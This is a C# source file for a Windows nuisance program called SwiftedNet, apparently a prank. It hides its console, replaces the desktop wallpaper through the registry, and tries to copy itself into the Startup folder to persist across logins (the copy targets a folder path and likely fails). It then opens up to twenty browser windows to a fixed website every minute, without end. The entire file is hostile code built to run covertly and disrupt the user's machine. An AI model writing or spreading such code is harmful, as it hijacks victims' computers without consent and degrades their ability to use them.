using System;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Threading;

using Microsoft.Win32;

namespace SwiftedNet
{
    class Program
    {
        private const string url = "https://www.taylorswift.com";
        private const int MIN_BROWSERS = 1;
        private const int MAX_BROWSERS = 20;
        private const int DELAY_MINUTES = 1;

        private const string RESOURCE_NAME = "bg.jpg";
        private const string BG_FILENAME = "bg.jpg";
        
        [DllImport("kernel32.dll")]
        static extern bool FreeConsole();

        const int SPI_SETDESKWALLPAPER = 20;
        const int SPIF_UPDATEINIFILE = 0x01;
        const int SPIF_SENDWININICHANGE = 0x02;

        [DllImport("user32.dll", CharSet = CharSet.Unicode)]
        static extern int SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni);

        private static void OpenBrowser(string url)
        {
            var psi = new ProcessStartInfo
            {
                FileName = url,
                UseShellExecute = true
            };

            Process.Start(psi);
        }

        private static void CopySelfTo(string path)
        {
            try
            {
                var fileBytes = File.ReadAllBytes(Assembly.GetExecutingAssembly().Location);

                File.WriteAllBytes(path, fileBytes);
            }
            catch (Exception)
            {
                // Wasn't run as admin
            }
        }

        private static void ExtractResource(string resourceName, string fileName)
        {
            var assembly = Assembly.GetExecutingAssembly();

            using (var resource = assembly.GetManifestResourceStream($"{assembly.GetName().Name}.{resourceName}"))
            {
                using (var file = new FileStream(fileName, FileMode.Create, FileAccess.Write))
                {
                    resource?.CopyTo(file);
                }
            }
        }

        private static void ChangeBackground(string resource)
        {
            var key = Registry.CurrentUser.OpenSubKey(@"Control Panel\Desktop", true);

            if (key == null)
            {
                return;
            }

            key.SetValue(@"WallpaperStyle", 2.ToString());
            key.SetValue(@"TileWallpaper", 0.ToString());

            ExtractResource(resource, BG_FILENAME);
            
            SystemParametersInfo(SPI_SETDESKWALLPAPER,
                0,
                Path.Combine(AppContext.BaseDirectory, BG_FILENAME),
                SPIF_UPDATEINIFILE | SPIF_SENDWININICHANGE);
        }

        static void Main(string[] args)
        {
            FreeConsole();
            
            ChangeBackground(RESOURCE_NAME);

            CopySelfTo(Environment.GetFolderPath(Environment.SpecialFolder.Startup));
            
            var rand = new Random(DateTime.Now.Day);

            while (true)
            {
                var numInstances = rand.Next(MIN_BROWSERS, MAX_BROWSERS);

                for (var x = 0; x < numInstances; x++)
                {
                    OpenBrowser(url);
                }

                Thread.Sleep(TimeSpan.FromMinutes(DELAY_MINUTES));
            }
        }
    }
}